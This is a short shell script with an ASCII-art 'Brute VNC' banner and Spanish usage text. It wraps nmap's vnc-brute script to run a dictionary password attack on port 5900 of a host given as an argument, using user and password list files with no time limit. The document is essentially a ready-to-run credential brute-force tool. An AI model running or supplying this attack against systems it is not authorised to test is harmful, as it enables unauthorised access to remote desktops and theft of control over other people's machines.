...
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 ...
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ...
  MMM      :M  'MMMMMMMMM  Brute VNC MMMMMMM'.MM  MM:M.    'MMMMM
...
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a VNC en puerto por defecto 5900/TCP."
        echo "Requiere nmap"
...
echo
echo
nmap $1 -p 5900 --script vnc-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
